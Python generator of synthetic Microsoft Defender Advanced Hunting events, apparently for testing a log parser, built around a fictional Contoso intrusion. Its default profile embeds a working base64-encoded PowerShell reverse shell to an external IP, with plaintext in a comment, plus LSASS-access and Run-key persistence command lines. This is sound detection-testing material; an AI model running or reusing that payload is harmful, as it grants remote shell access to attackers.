#!/usr/bin/env python3
"""
Microsoft 365 Defender / Defender XDR Advanced Hunting event generator.

Emits schema-accurate samples for the Advanced Hunting tables documented in
microsoft_defender_telemetry_and_alerts.md:

  - DeviceFileEvents
  - DeviceProcessEvents
  - DeviceNetworkEvents
  - DeviceEvents (AMSI / AV / LsassAccess)
  - DeviceRegistryEvents
  - DeviceLogonEvents
  - IdentityLogonEvents (MDI)
  - EntraIdSignInEvents
  - CloudAppEvents (MDA)
  - AlertInfo / AlertEvidence (hunting view)

All events are flat dicts with the table-native field names (no nested
``properties`` block) so the existing ``microsoft_365_defender-latest``
parser sees them in the same shape as the real Advanced Hunting export.

The legacy ``microsoft_365_defender_log()`` entrypoint is preserved as a
back-compat shim that round-robins through the per-table functions.
"""
from __future__ import annotations

import json
import random
import secrets
import string
import time
import uuid
from datetime import datetime, timedelta, timezone
from typing import Any, Dict, List, Optional

# ---------------------------------------------------------------------------
# Shared "contoso" profile — matches microsoft_defender_telemetry_and_alerts.md
# ---------------------------------------------------------------------------

DEFAULT_PROFILE: Dict[str, Any] = {
    "tenant_id": "b3c1b5fc-828c-45fa-a1e1-10d74f6d6e9c",
    "incident_id": "28293",
    "victim": {
        "upn": "alex.morgan@contoso.com",
        "name": "alex.morgan",
        "domain": "contoso",
        "domain_fqdn": "contoso.corp",
        "display_name": "Alex Morgan",
        "sid": "S-1-5-21-1004336348-1177238915-682003330-1284",
        "object_id": "9a8b7c6d-1234-5678-90ab-cdef01234567",
        "logon_id": 489274,
    },
    "device": {
        "id": "47f8a3c2e9b14d6580f1ce7a9b3d2e5814f7c0a2",
        "name": "ws-fin-042.contoso.corp",
        "local_ip": "10.84.17.42",
        "aad_id": "c1d2e3f4-a5b6-7890-1234-567890abcdef",
    },
    "dc": {
        "id": "f8e7d6c5b4a3928171605f4e3d2c1b0a98876543",
        "name": "dc01.contoso.corp",
        "ip": "10.84.1.10",
    },
    "attacker": {
        "ip": "185.220.101.10",
        "c2_ip": "195.201.59.127",
        "c2_port": 4443,
        "country": "RO",
        "tor": True,
    },
    "malware": {
        "lnk_sha1": "f9e8d7c6b5a4938271605f4e3d2c1b0a98876543",
        "lnk_sha256": "1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b",
        "lnk_path": "C:\\Users\\alex.morgan\\Downloads\\invoice-04827\\Invoice_INV-2026-04827.pdf.lnk",
        "ps_sha1": "3f0d8e7c6b5a4938271605f4e3d2c1b0a9887654",
        "ps_sha256": "9f8e7d6c5b4a3928171605f4e3d2c1b0a98876541a2b3c4d5e6f7a8b9c0d1e2f",
        # Real, valid UTF-16LE base64-encoded reverse shell (decodes cleanly
        # with ``[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($s))``).
        # Plaintext: ``$client = New-Object System.Net.Sockets.TCPClient("195.201.59.127",4443);
        # $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read(
        # $bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName
        # System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 |
        # Out-String ); $sendback2 = $sendback + "PS " + (pwd).Path + "> "; $sendbytes =
        # ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbytes,0,
        # $sendbytes.Length); $stream.Flush()}; $client.Close()``
        "ps_command": (
            "powershell.exe -nop -w hidden -ep bypass -enc "
            "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABl"
            "AG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIA"
            "MQA5ADUALgAyADAAMQAuADUAOQAuADEAMgA3ACIALAA0ADQANAAzACkAOwAkAHMAdABy"
            "AGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkA"
            "OwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1"
            "AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0A"
            "LgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABl"
            "AG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4A"
            "ZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBt"
            "AC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMA"
            "dAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABi"
            "AGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8A"
            "dQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAk"
            "AHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4A"
            "UABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAcwAgAD0AIAAo"
            "AFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcA"
            "ZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBh"
            "AG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQBzACwAMAAsACQAcwBlAG4A"
            "ZABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1"
            "AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
        ),
        "threat_name": "Backdoor:PowerShell/Bovter.A",
        "threat_family": "Bovter",
    },
    "zip": {
        "sha1": "8a3f1b7e9c2d4e6f8a1b3c5d7e9f1a3b5c7d9e1f",
        "sha256": "3f8e9d2c1a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d",
        "md5": "d41d8cd98f00b204e9800998ecf8427e",
        "size": 187432,
        "name": "invoice-04827.zip",
        "origin_url": "https://arcadia-cdn-edge.b-cdn.net/dl/invoice-04827.zip",
    },
}

# ---------------------------------------------------------------------------
# Formatting helpers
# ---------------------------------------------------------------------------


def _utc_now() -> datetime:
    return datetime.now(timezone.utc)


def _iso_z(dt: datetime) -> str:
    """ISO-8601 with 7-digit fractional second + Z suffix (Defender format)."""
    if dt.tzinfo is None:
        dt = dt.replace(tzinfo=timezone.utc)
    base = dt.strftime("%Y-%m-%dT%H:%M:%S")
    # Build 7-digit fractional second deterministically.
    frac = f"{dt.microsecond:06d}{random.randint(0, 9)}"
    return f"{base}.{frac}Z"


def _report_id() -> int:
    return random.randint(8_472_690_000, 8_472_699_999)


def _hex(n: int) -> str:
    return "".join(random.choices(string.hexdigits.lower()[:16], k=n))


def _sha1() -> str:
    return _hex(40)


def _sha256() -> str:
    return _hex(64)


def _md5() -> str:
    return _hex(32)


def _ulid_like() -> str:
    alphabet = string.digits + "ABCDEFGHJKMNPQRSTVWXYZ"
    return "".join(random.choices(alphabet, k=26))


def _resolve_profile(overrides: Optional[Dict[str, Any]]) -> Dict[str, Any]:
    """Return a shallow copy of DEFAULT_PROFILE merged with profile overrides."""
    if not overrides:
        return DEFAULT_PROFILE
    prof_over = overrides.get("_profile")
    if not prof_over:
        return DEFAULT_PROFILE
    merged = json.loads(json.dumps(DEFAULT_PROFILE))
    for k, v in prof_over.items():
        if isinstance(v, dict) and isinstance(merged.get(k), dict):
            merged[k].update(v)
        else:
            merged[k] = v
    return merged


def _strip_internal(overrides: Optional[Dict[str, Any]]) -> Dict[str, Any]:
    if not overrides:
        return {}
    return {k: v for k, v in overrides.items() if not k.startswith("_")}


def _apply_overrides(event: Dict[str, Any], overrides: Optional[Dict[str, Any]]) -> Dict[str, Any]:
    o = _strip_internal(overrides)
    if o:
        event.update(o)
    return event


# ---------------------------------------------------------------------------
# DeviceFileEvents (1.4)
# ---------------------------------------------------------------------------


def device_file_events_log(overrides: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """Generate a DeviceFileEvents row (FileCreated by default)."""
    profile = _resolve_profile(overrides)
    victim = profile["victim"]
    device = profile["device"]
    zip_ = profile["zip"]
    mal = profile["malware"]

    now = _utc_now()
    is_lnk = random.random() < 0.5

    event: Dict[str, Any] = {
        "Timestamp": _iso_z(now),
        "DeviceId": device["id"],
        "DeviceName": device["name"],
        "ActionType": "FileCreated",
        "FileName": mal["lnk_path"].split("\\")[-1] if is_lnk else zip_["name"],
        "FolderPath": (
            "C:\\Users\\alex.morgan\\Downloads\\invoice-04827"
            if is_lnk
            else "C:\\Users\\alex.morgan\\Downloads"
        ),
        "SHA1": mal["lnk_sha1"] if is_lnk else zip_["sha1"],
        "SHA256": mal["lnk_sha256"] if is_lnk else zip_["sha256"],
        "MD5": _md5() if is_lnk else zip_["md5"],
        "FileSize": 2847 if is_lnk else zip_["size"],
        "FileOriginUrl": "" if is_lnk else zip_["origin_url"],
        "FileOriginReferrerUrl": "" if is_lnk else "https://secure-invoice-portal.arcadia-cdn.net/inv/04827/view",
        "FileOriginIP": None if is_lnk else "203.0.113.184",
        "PreviousFolderPath": "",
        "PreviousFileName": "",
        "RequestProtocol": "Https",
        "ShareName": "",
        "RequestSourceIP": None,
        "RequestSourcePort": None,
        "RequestAccountName": victim["name"],
        "RequestAccountDomain": victim["domain"].upper(),
        "RequestAccountSid": victim["sid"],
        "InitiatingProcessAccountDomain": victim["domain"],
        "InitiatingProcessAccountName": victim["name"],
        "InitiatingProcessAccountSid": victim["sid"],
        "InitiatingProcessAccountUpn": victim["upn"],
        "InitiatingProcessAccountObjectId": victim["object_id"],
        "InitiatingProcessMD5": _md5(),
        "InitiatingProcessSHA1": _sha1(),
        "InitiatingProcessSHA256": _sha256(),
        "InitiatingProcessFolderPath": (
            "c:\\windows" if is_lnk else "c:\\program files\\google\\chrome\\application\\msedge_proxy.exe"
        ),
        "InitiatingProcessFileName": "explorer.exe" if is_lnk else "msedge.exe",
        "InitiatingProcessFileSize": 4_915_200 if is_lnk else 3_284_192,
        "InitiatingProcessVersionInfoCompanyName": "Microsoft Corporation",
        "InitiatingProcessVersionInfoProductName": "Microsoft Windows" if is_lnk else "Microsoft Edge",
        "InitiatingProcessVersionInfoProductVersion": "10.0.22631.3737" if is_lnk else "125.0.2535.85",
        "InitiatingProcessVersionInfoInternalFileName": "explorer" if is_lnk else "msedge_proxy",
        "InitiatingProcessVersionInfoOriginalFileName": (
            "EXPLORER.EXE" if is_lnk else "msedge_proxy.exe"
        ),
        "InitiatingProcessVersionInfoFileDescription": "Windows Explorer" if is_lnk else "Microsoft Edge",
        "InitiatingProcessId": random.randint(4000, 12000),
        "InitiatingProcessCommandLine": (
            "C:\\Windows\\Explorer.EXE"
            if is_lnk
            else '"msedge.exe" --type=utility --utility-sub-type=network.mojom.NetworkService'
        ),
        "InitiatingProcessCreationTime": _iso_z(now - timedelta(hours=4)),
        "InitiatingProcessIntegrityLevel": "Medium" if is_lnk else "Low",
        "InitiatingProcessTokenElevation": "TokenElevationTypeDefault",
        "InitiatingProcessParentId": random.randint(700, 8000),
        "InitiatingProcessParentFileName": "userinit.exe" if is_lnk else "msedge.exe",
        "InitiatingProcessParentCreationTime": _iso_z(now - timedelta(hours=4, seconds=1)),
        "ReportId": _report_id(),
        "AppGuardContainerId": "",
        "AdditionalFields": json.dumps(
            {"ArchiveSource": zip_["name"], "MotwApplied": True}
            if is_lnk
            else {"SmartScreenWarning": "None", "MotwApplied": True, "ZoneIdentifier": "3"}
        ),
        "SensitivityLabel": "",
        "SensitivitySubLabel": "",
        "IsAzureInfoProtectionApplied": False,
        "_table": "DeviceFileEvents",
    }
    return _apply_overrides(event, overrides)


# ---------------------------------------------------------------------------
# DeviceProcessEvents (1.5)
# ---------------------------------------------------------------------------


def device_process_events_log(overrides: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """Generate a DeviceProcessEvents row (cmd → powershell -enc by default)."""
    profile = _resolve_profile(overrides)
    victim = profile["victim"]
    device = profile["device"]
    mal = profile["malware"]

    now = _utc_now()
    ps_pid = random.randint(9000, 12000)
    cmd_pid = ps_pid - random.randint(100, 800)

    event: Dict[str, Any] = {
        "Timestamp": _iso_z(now),
        "DeviceId": device["id"],
        "DeviceName": device["name"],
        "ActionType": "ProcessCreated",
        "FileName": "powershell.exe",
        "FolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0",
        "SHA1": mal["ps_sha1"],
        "SHA256": mal["ps_sha256"],
        "MD5": _md5(),
        "FileSize": 452608,
        "ProcessVersionInfoCompanyName": "Microsoft Corporation",
        "ProcessVersionInfoProductName": "Microsoft\u00ae Windows\u00ae Operating System",
        "ProcessVersionInfoProductVersion": "10.0.22631.3737",
        "ProcessVersionInfoInternalFileName": "POWERSHELL",
        "ProcessVersionInfoOriginalFileName": "PowerShell.EXE",
        "ProcessVersionInfoFileDescription": "Windows PowerShell",
        "ProcessId": ps_pid,
        "ProcessCommandLine": mal["ps_command"],
        "ProcessIntegrityLevel": "Medium",
        "ProcessTokenElevation": "TokenElevationTypeDefault",
        "ProcessCreationTime": _iso_z(now),
        "AccountDomain": victim["domain"],
        "AccountName": victim["name"],
        "AccountSid": victim["sid"],
        "AccountUpn": victim["upn"],
        "AccountObjectId": victim["object_id"],
        "LogonId": victim["logon_id"],
        "InitiatingProcessAccountDomain": victim["domain"],
        "InitiatingProcessAccountName": victim["name"],
        "InitiatingProcessAccountSid": victim["sid"],
        "InitiatingProcessAccountUpn": victim["upn"],
        "InitiatingProcessAccountObjectId": victim["object_id"],
        "InitiatingProcessLogonId": victim["logon_id"],
        "InitiatingProcessIntegrityLevel": "Medium",
        "InitiatingProcessTokenElevation": "TokenElevationTypeDefault",
        "InitiatingProcessSHA1": _sha1(),
        "InitiatingProcessSHA256": _sha256(),
        "InitiatingProcessMD5": _md5(),
        "InitiatingProcessFileName": "cmd.exe",
        "InitiatingProcessFileSize": 289792,
        "InitiatingProcessId": cmd_pid,
        "InitiatingProcessCommandLine": (
            f'cmd.exe /c "{mal["ps_command"]}"'
        ),
        "InitiatingProcessCreationTime": _iso_z(now - timedelta(milliseconds=150)),
        "InitiatingProcessFolderPath": "c:\\windows\\system32",
        "InitiatingProcessParentFileName": "explorer.exe",
        "InitiatingProcessParentId": random.randint(5000, 8000),
        "InitiatingProcessParentCreationTime": _iso_z(now - timedelta(hours=4)),
        "InitiatingProcessVersionInfoCompanyName": "Microsoft Corporation",
        "InitiatingProcessVersionInfoProductName": "Microsoft\u00ae Windows\u00ae Operating System",
        "InitiatingProcessVersionInfoOriginalFileName": "Cmd.Exe",
        "InitiatingProcessVersionInfoFileDescription": "Windows Command Processor",
        "ProcessUniqueId": f"PRSTKEY_{_ulid_like()}",
        "InitiatingProcessUniqueId": f"PRSTKEY_{_ulid_like()}",
        "ReportId": _report_id(),
        "AppGuardContainerId": "",
        "AdditionalFields": json.dumps(
            {
                "DecodedCommandLine": (
                    '$client = New-Object System.Net.Sockets.TCPClient('
                    f'"{profile["attacker"]["c2_ip"]}",{profile["attacker"]["c2_port"]})'
                )
            }
        ),
        "_table": "DeviceProcessEvents",
    }
    return _apply_overrides(event, overrides)


# ---------------------------------------------------------------------------
# DeviceNetworkEvents (1.6)
# ---------------------------------------------------------------------------


def device_network_events_log(overrides: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """Generate a DeviceNetworkEvents C2 callback row."""
    profile = _resolve_profile(overrides)
    victim = profile["victim"]
    device = profile["device"]
    attacker = profile["attacker"]
    mal = profile["malware"]

    now = _utc_now()
    event: Dict[str, Any] = {
        "Timestamp": _iso_z(now),
        "DeviceId": device["id"],
        "DeviceName": device["name"],
        "ActionType": "ConnectionSuccess",
        "RemoteIP": attacker["c2_ip"],
        "RemotePort": attacker["c2_port"],
        "RemoteUrl": "",
        "LocalIP": device["local_ip"],
        "LocalPort": random.randint(49152, 65535),
        "Protocol": "Tcp",
        "LocalIPType": "Private",
        "RemoteIPType": "Public",
        "InitiatingProcessSHA1": mal["ps_sha1"],
        "InitiatingProcessSHA256": mal["ps_sha256"],
        "InitiatingProcessMD5": _md5(),
        "InitiatingProcessFileName": "powershell.exe",
        "InitiatingProcessFileSize": 452608,
        "InitiatingProcessVersionInfoCompanyName": "Microsoft Corporation",
        "InitiatingProcessVersionInfoProductName": "Microsoft\u00ae Windows\u00ae Operating System",
        "InitiatingProcessVersionInfoOriginalFileName": "PowerShell.EXE",
        "InitiatingProcessVersionInfoFileDescription": "Windows PowerShell",
        "InitiatingProcessId": 10284,
        "InitiatingProcessCommandLine": mal["ps_command"],
        "InitiatingProcessCreationTime": _iso_z(now - timedelta(seconds=1)),
        "InitiatingProcessFolderPath": "c:\\windows\\system32\\windowspowershell\\v1.0",
        "InitiatingProcessParentFileName": "cmd.exe",
        "InitiatingProcessParentId": 9847,
        "InitiatingProcessParentCreationTime": _iso_z(now - timedelta(seconds=2)),
        "InitiatingProcessAccountDomain": victim["domain"],
        "InitiatingProcessAccountName": victim["name"],
        "InitiatingProcessAccountSid": victim["sid"],
        "InitiatingProcessAccountUpn": victim["upn"],
        "InitiatingProcessAccountObjectId": victim["object_id"],
        "InitiatingProcessLogonId": victim["logon_id"],
        "InitiatingProcessIntegrityLevel": "Medium",
        "InitiatingProcessTokenElevation": "TokenElevationTypeDefault",
        "ReportId": _report_id(),
        "AppGuardContainerId": "",
        "AdditionalFields": json.dumps(
            {"DirectionLocalToRemote": True, "ConnectionId": _hex(4) + "-" + _hex(4) + "-" + _hex(4)}
        ),
        "_table": "DeviceNetworkEvents",
    }
    return _apply_overrides(event, overrides)


# ---------------------------------------------------------------------------
# DeviceEvents (1.7) — AMSI / AV / LsassAccess
# ---------------------------------------------------------------------------


def device_events_log(overrides: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """Generate a DeviceEvents row. action_type override controls which variant."""
    profile = _resolve_profile(overrides)
    victim = profile["victim"]
    device = profile["device"]
    mal = profile["malware"]

    action_type = (overrides or {}).get("ActionType") or random.choice(
        ["AmsiScriptDetection", "AntivirusDetection", "LsassAccess"]
    )
    now = _utc_now()

    base: Dict[str, Any] = {
        "Timestamp": _iso_z(now),
        "DeviceId": device["id"],
        "DeviceName": device["name"],
        "ActionType": action_type,
        "AccountName": victim["name"],
        "AccountDomain": victim["domain"],
        "AccountUpn": victim["upn"],
        "AccountObjectId": victim["object_id"],
        "ReportId": _report_id(),
        "_table": "DeviceEvents",
    }

    if action_type == "AmsiScriptDetection":
        base.update(
            {
                "FileName": "",
                "FolderPath": "",
                "SHA1": "",
                "SHA256": "",
                "ProcessCommandLine": mal["ps_command"],
                "ProcessId": 10284,
                "InitiatingProcessFileName": "powershell.exe",
                "InitiatingProcessId": 10284,
                "InitiatingProcessCommandLine": mal["ps_command"],
                "InitiatingProcessSHA1": mal["ps_sha1"],
                "InitiatingProcessFolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0",
                "InitiatingProcessVersionInfoOriginalFileName": "PowerShell.EXE",
                "InitiatingProcessVersionInfoFileDescription": "Windows PowerShell",
                "InitiatingProcessUniqueId": f"PRSTKEY_{_ulid_like()}",
                "InitiatingProcessParentFileName": "cmd.exe",
                "InitiatingProcessParentId": 9847,
                "AdditionalFields": json.dumps(
                    {
                        "ScriptContent": "<base64-decoded reverse shell>",
                        "ContentName": "PowerShell",
                        "AmsiProvider": "Windows Defender",
                        "DetectionName": mal["threat_name"],
                    }
                ),
            }
        )
    elif action_type == "AntivirusDetection":
        base.update(
            {
                "FileName": "powershell.exe",
                "FolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0",
                "SHA1": mal["ps_sha1"],
                "ProcessCommandLine": mal["ps_command"],
                "ProcessId": 10284,
                "InitiatingProcessFileName": "MsMpEng.exe",
                "InitiatingProcessId": 4128,
                "InitiatingProcessFolderPath": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24050.5-0",
                "InitiatingProcessVersionInfoOriginalFileName": "MsMpEng.exe",
                "InitiatingProcessVersionInfoFileDescription": "Antimalware Service Executable",
                "InitiatingProcessUniqueId": f"PRSTKEY_{_ulid_like()}",
                "InitiatingProcessParentFileName": "services.exe",
                "InitiatingProcessParentId": 712,
                "AdditionalFields": json.dumps(
                    {
                        "ThreatName": mal["threat_name"],
                        "ThreatId": 2147736291,
                        "Severity": "Severe",
                        "Category": "Backdoor",
                        "DetectionSource": "Behavior",
                        "WasExecutingWhileDetected": True,
                        "RemediationAction": "Quarantine",
                        "WasRemediated": True,
                        "WasInQuarantine": True,
                        "EngineVersion": "1.1.24050.5",
                        "SignatureVersion": "1.413.847.0",
                    }
                ),
            }
        )
    elif action_type == "LsassAccess":
        base.update(
            {
                "FileName": "lsass.exe",
                "FolderPath": "C:\\Windows\\System32",
                "ProcessId": 712,
                "InitiatingProcessFileName": "rundll32.exe",
                "InitiatingProcessId": 11247,
                "InitiatingProcessCommandLine": (
                    "rundll32.exe C:\\Users\\alex.morgan\\AppData\\Local\\Temp\\diag.dll,Entry"
                ),
                "InitiatingProcessFolderPath": "C:\\Windows\\System32",
                "InitiatingProcessVersionInfoOriginalFileName": "RUNDLL32.EXE",
                "InitiatingProcessVersionInfoFileDescription": "Windows host process (Rundll32)",
                "InitiatingProcessUniqueId": f"PRSTKEY_{_ulid_like()}",
                "InitiatingProcessParentFileName": "powershell.exe",
                "InitiatingProcessParentId": 10284,
                "InitiatingProcessAccountName": victim["name"],
                "InitiatingProcessAccountDomain": victim["domain"],
                "AdditionalFields": json.dumps(
                    {
                        "DesiredAccess": "0x1010",
                        "AccessMask": "PROCESS_VM_READ|PROCESS_QUERY_LIMITED_INFORMATION",
                        "TargetProcessName": "lsass.exe",
                        "TargetProcessId": 712,
                    }
                ),
            }
        )

    return _apply_overrides(base, overrides)


# ---------------------------------------------------------------------------
# DeviceRegistryEvents (1.8)
# ---------------------------------------------------------------------------


def device_registry_events_log(overrides: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """Generate a DeviceRegistryEvents row (HKCU Run persistence by default)."""
    profile = _resolve_profile(overrides)
    victim = profile["victim"]
    device = profile["device"]
    mal = profile["malware"]

    now = _utc_now()
    event: Dict[str, Any] = {
        "Timestamp": _iso_z(now),
        "DeviceId": device["id"],
        "DeviceName": device["name"],
        "ActionType": "RegistryValueSet",
        "RegistryKey": "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        "RegistryValueType": "String",
        "RegistryValueName": "SecurityHealthCheck",
        "RegistryValueData": (
            "rundll32.exe C:\\Users\\alex.morgan\\AppData\\Roaming\\Microsoft\\Spool\\diag.dll,Entry"
        ),
        "PreviousRegistryKey": "",
        "PreviousRegistryValueName": "",
        "PreviousRegistryValueData": "",
        "InitiatingProcessFileName": "powershell.exe",
        "InitiatingProcessId": 10284,
        "InitiatingProcessCommandLine": mal["ps_command"],
        "InitiatingProcessSHA1": mal["ps_sha1"],
        "InitiatingProcessAccountName": victim["name"],
        "InitiatingProcessAccountDomain": victim["domain"],
        "InitiatingProcessAccountSid": victim["sid"],
        "InitiatingProcessAccountUpn": victim["upn"],
        "InitiatingProcessAccountObjectId": victim["object_id"],
        "InitiatingProcessIntegrityLevel": "Medium",
        "InitiatingProcessTokenElevation": "TokenElevationTypeDefault",
        "InitiatingProcessParentFileName": "cmd.exe",
        "InitiatingProcessParentId": 9847,
        "ReportId": _report_id(),
        "AdditionalFields": "{}",
        "_table": "DeviceRegistryEvents",
    }
    return _apply_overrides(event, overrides)


# ---------------------------------------------------------------------------
# DeviceLogonEvents (1.9)
# ---------------------------------------------------------------------------


def device_logon_events_log(overrides: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """Generate a DeviceLogonEvents row (failed RDP to DC by default)."""
    profile = _resolve_profile(overrides)
    victim = profile["victim"]
    device = profile["device"]
    dc = profile["dc"]
    mal = profile["malware"]

    now = _utc_now()
    event: Dict[str, Any] = {
        "Timestamp": _iso_z(now),
        "DeviceId": dc["id"],
        "DeviceName": dc["name"],
        "ActionType": "LogonFailed",
        "LogonType": "RemoteInteractive",
        "AccountDomain": victim["domain"].upper(),
        "AccountName": "svc-backup",
        "AccountSid": "S-1-5-21-1004336348-1177238915-682003330-1547",
        "Protocol": "Ntlm",
        "FailureReason": "InvalidUserNameOrPassword",
        "RemoteDeviceName": device["name"],
        "RemoteIP": device["local_ip"],
        "RemoteIPType": "Private",
        "RemotePort": random.randint(49152, 65535),
        "AdditionalFields": json.dumps(
            {"LogonId": 0, "Status": "0xC000006D", "SubStatus": "0xC000006A"}
        ),
        "InitiatingProcessAccountDomain": victim["domain"],
        "InitiatingProcessAccountName": victim["name"],
        "InitiatingProcessAccountSid": victim["sid"],
        "InitiatingProcessAccountUpn": victim["upn"],
        "InitiatingProcessLogonId": victim["logon_id"],
        "InitiatingProcessIntegrityLevel": "Medium",
        "InitiatingProcessTokenElevation": "TokenElevationTypeDefault",
        "InitiatingProcessSHA1": mal["ps_sha1"],
        "InitiatingProcessFileName": "powershell.exe",
        "InitiatingProcessId": 10284,
        "InitiatingProcessCommandLine": mal["ps_command"],
        "InitiatingProcessParentFileName": "cmd.exe",
        "InitiatingProcessParentId": 9847,
        "ReportId": _report_id(),
        "_table": "DeviceLogonEvents",
    }
    return _apply_overrides(event, overrides)


# ---------------------------------------------------------------------------
# IdentityLogonEvents (1.10) — MDI Kerberoasting
# ---------------------------------------------------------------------------


def identity_logon_events_log(overrides: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """Generate an IdentityLogonEvents row (MDI Kerberos RC4 SPN by default)."""
    profile = _resolve_profile(overrides)
    victim = profile["victim"]
    device = profile["device"]
    dc = profile["dc"]

    now = _utc_now()
    event: Dict[str, Any] = {
        "Timestamp": _iso_z(now),
        "ActionType": "LogonSuccess",
        "Application": "Active Directory",
        "LogonType": "Network",
        "Protocol": "Kerberos",
        "FailureReason": "",
        "AccountName": victim["name"],
        "AccountDomain": victim["domain_fqdn"],
        "AccountUpn": victim["upn"],
        "AccountObjectId": victim["object_id"],
        "AccountSid": victim["sid"],
        "AccountDisplayName": victim["display_name"],
        "DeviceName": device["name"],
        "IPAddress": device["local_ip"],
        "Port": random.randint(49152, 65535),
        "DestinationDeviceName": dc["name"],
        "DestinationIPAddress": dc["ip"],
        "DestinationPort": "88",
        "ReportId": f"Mdi-{int(time.time())}-{_hex(8)}",
        "AdditionalFields": json.dumps(
            {
                "TicketEncryptionType": "RC4-HMAC",
                "ServiceName": "svc-fileshare",
                "ServiceSid": "S-1-5-21-1004336348-1177238915-682003330-1701",
                "IsAnomalous": True,
            }
        ),
        "_table": "IdentityLogonEvents",
    }
    return _apply_overrides(event, overrides)


# ---------------------------------------------------------------------------
# EntraIdSignInEvents (1.11)
# ---------------------------------------------------------------------------


def entra_id_signin_events_log(overrides: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """Generate an EntraIdSignInEvents row (anonymizer/Tor sign-in by default)."""
    profile = _resolve_profile(overrides)
    victim = profile["victim"]
    attacker = profile["attacker"]

    now = _utc_now()
    event: Dict[str, Any] = {
        "Timestamp": _iso_z(now),
        "Application": "Office 365 Exchange Online",
        "ApplicationId": "00000002-0000-0ff1-ce00-000000000000",
        "LogonType": "interactiveUser",
        "ErrorCode": 0,
        "CorrelationId": str(uuid.uuid4()),
        "SessionId": str(uuid.uuid4()),
        "AccountDisplayName": victim["display_name"],
        "AccountObjectId": victim["object_id"],
        "AccountUpn": victim["upn"],
        "IsExternalUser": 0,
        "IsGuest": False,
        "AlternateSignInName": "",
        "Resource": "Office 365 Exchange Online",
        "ResourceId": "00000002-0000-0ff1-ce00-000000000000",
        "ResourceTenantId": profile["tenant_id"],
        "DeviceName": "",
        "AadDeviceId": "",
        "OSPlatform": "Linux",
        "DeviceTrustType": "",
        "IsManaged": False,
        "IsCompliant": False,
        "AuthenticationProcessingDetails": json.dumps(
            [
                {"key": "Legacy TLS (TLS 1.0, 1.1, 3DES)", "value": "False"},
                {"key": "Is CAE Token", "value": "False"},
            ]
        ),
        "AuthenticationRequirement": "multiFactorAuthentication",
        "TokenIssuerType": "AzureAD",
        "RiskLevelAggregated": 100,
        "RiskLevelDuringSignIn": 100,
        "RiskState": "atRisk",
        "RiskDetails": "anonymizedIPAddress",
        "UserAgent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
        "Browser": "Firefox 119.0",
        "ConditionalAccessPolicies": json.dumps(
            [
                {
                    "id": "ca-block-anonymizer",
                    "displayName": "Block anonymizer access",
                    "result": "failure",
                    "enforcedGrantControls": ["BLOCK"],
                }
            ]
        ),
        "ConditionalAccessStatus": "failure",
        "IPAddress": attacker["ip"],
        "Country": attacker["country"],
        "State": "Bucuresti",
        "City": "Bucharest",
        "Latitude": "44.4361",
        "Longitude": "26.1027",
        "NetworkLocationDetails": json.dumps(
            [{"networkType": "anonymizedIPAddress", "networkNames": []}]
        ),
        "RequestId": str(uuid.uuid4()),
        "ReportId": f"EntraId-{now.strftime('%Y%m%d%H')}-{random.randint(1000000, 9999999)}",
